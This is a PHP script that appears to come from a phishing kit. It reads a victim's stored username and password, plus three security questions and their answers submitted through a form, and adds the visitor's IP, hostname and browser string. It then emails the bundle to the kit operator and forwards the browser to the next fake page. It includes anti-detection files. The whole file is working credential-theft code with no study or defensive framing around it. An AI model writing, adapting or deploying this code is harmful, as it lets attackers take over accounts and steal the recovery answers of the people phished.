<?php
session_start();
	include "email.php";
		include './prevents/anti7.php';
			include './prevents/anti8.php';
				include './prevents/anti9.php';


$q1 = $_POST['Q1'];
$q2 = $_POST['Q2'];
$q3 = $_POST['Q3'];
$a1 = $_POST['A1'];
$a2 = $_POST['A2'];
$a3 = $_POST['A3'];

$user = $_SESSION['username'];
$pass = $_SESSION['password'];
$_SESSION['Q1'] = $_POST['Q1'];
$_SESSION['Q2'] = $_POST['Q2'];
$_SESSION['Q3'] = $_POST['Q3'];

$_SESSION['A1'] = $_POST['A1'];
$_SESSION['A2'] = $_POST['A2'];
$_SESSION['A3'] = $_POST['A3'];




if (getenv('HTTP_CLIENT_IP')){
	$ip=getenv('HTTP_CLIENT_IP');}
else {
	$ip=getenv('REMOTE_ADDR');}
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$browser = $_SERVER['HTTP_USER_AGENT'];
$data = "
=====================
U: $user
P: $pass

Q1: $q1
A1: $a1

Q2: $q2
A2: $a2

Q3: $q3
A3: $a3


------------------------
Ip: $ip,$browser
Host: $hostname
=====================";
 if ($a1 == "" && strlen($a1)<15 ) {
  echo "<meta http-equiv='refresh' content='0;url=quest.htm'>";
  
}
$subj = "#MANU# $user $ip";


mail($emailusr,$subj,$data);




?>
<script>
    window.top.location.href = "load/p2.htm";

</script>